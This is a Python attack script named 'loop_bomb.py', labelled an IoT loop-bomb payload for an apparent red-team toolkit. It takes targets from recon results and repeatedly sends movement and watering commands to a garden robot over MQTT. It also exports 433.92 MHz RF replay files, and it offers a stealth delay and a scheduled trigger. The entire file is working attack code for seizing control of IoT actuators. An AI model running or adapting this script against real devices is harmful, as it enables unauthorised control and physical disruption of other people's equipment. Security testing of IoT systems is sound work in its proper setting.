#!/usr/bin/env python3
# loop_bomb.py - IoT Loop Bomb Payload with MQTT, RF export, Timed Trigger

import time
import argparse
import random
import os
import paho.mqtt.publish as publish
from datetime import datetime

# Default commands
COMMANDS = ["MOVE_FORWARD", "STOP", "WATER_ON", "WATER_OFF"]

# MQTT settings (can be customized)
MQTT_BROKER = "localhost"
MQTT_PORT = 1883
MQTT_TOPIC = "iot/gardener/commands"

# Simulated RF export mapping
RF_SIGNAL_MAP = {
    "MOVE_FORWARD": "101100110111",
    "STOP": "000011110000",
    "WATER_ON": "111000111000",
    "WATER_OFF": "001100110011"
}

def send_command(target, command, stealth=False, mqtt=False, rf_log=None):
    if stealth:
        print(f"[Stealth] Sending command to {target}: {command}")
        time.sleep(random.uniform(0.5, 1.2))
    else:
        print(f"[+] Sending command to {target}: {command}")
        time.sleep(0.1)

    if mqtt:
        try:
            publish.single(MQTT_TOPIC, payload=f"{target}:{command}", hostname=MQTT_BROKER, port=MQTT_PORT)
            print(f"    -> MQTT sent to {MQTT_TOPIC}")
        except Exception as e:
            print(f"    -> MQTT send failed: {e}")

    if rf_log:
        rf_payload = RF_SIGNAL_MAP.get(command, "000000")
        rf_log.write(f"# {command}\nfrequency=433920000\nprotocol=raw\nrepeats=3\nraw={rf_payload}\n\n")

def get_targets(recon_file="recon_results/loop_targets.txt"):
    try:
        with open(recon_file) as f:
            targets = [line.strip() for line in f if line.strip()]
        if not targets:
            raise Exception
        print("\n[+] Targets loaded from recon results:")
        for idx, t in enumerate(targets):
            print(f"    [{idx+1}] {t}")
        choice = input("Select target [1-N] or type 'manual': ").strip()
        if choice.lower() == 'manual':
            return [input("Enter manual target (IP/hostname): ").strip()]
        else:
            index = int(choice) - 1
            return [targets[index]]
    except:
        print("[!] Failed to load targets. Please enter manually.")
        return [input("Enter target IP or hostname: ").strip()]

def wait_until_trigger(trigger_time):
    now = datetime.now().strftime("%H:%M")
    print(f"[i] Waiting until trigger time {trigger_time} (current: {now})...")
    while datetime.now().strftime("%H:%M") != trigger_time:
        time.sleep(10)

# Argument parser
parser = argparse.ArgumentParser(description="IoT Loop Bomb Payload - REDoT")
parser.add_argument('--stealth', action='store_true', help='Enable stealth mode (random delay)')
parser.add_argument('--loops', type=int, default=5, help='Number of loop iterations')
parser.add_argument('--mqtt', action='store_true', help='Enable MQTT command delivery')
parser.add_argument('--rf', action='store_true', help='Export RF commands as .sub file')
parser.add_argument('--target', help='Manual target override')
parser.add_argument('--trigger', help='Scheduled time trigger (HH:MM)')
args = parser.parse_args()

# Trigger delay
if args.trigger:
    wait_until_trigger(args.trigger)

# Target(s)
targets = [args.target] if args.target else get_targets()

# RF export setup
rf_log = None
rf_path = ""
if args.rf:
    os.makedirs("rf_exports", exist_ok=True)
    rf_path = f"rf_exports/loop_bomb_{datetime.now().strftime('%Y%m%d_%H%M%S')}.sub"
    rf_log = open(rf_path, "w")

# Main loop
print(f"\n[+] Starting Loop Bomb | Loops: {args.loops} | Stealth: {args.stealth} | MQTT: {args.mqtt}")
start = datetime.now()

for target in targets:
    for loop in range(1, args.loops + 1):
        print(f"\n--- Loop {loop} for {target} ---")
        for cmd in COMMANDS:
            send_command(target, cmd, stealth=args.stealth, mqtt=args.mqtt, rf_log=rf_log)

if rf_log:
    rf_log.close()
    print(f"[✓] RF .sub export saved to: {rf_path}")

print(f"\n[✓] Loop Bomb Finished in {datetime.now() - start}")
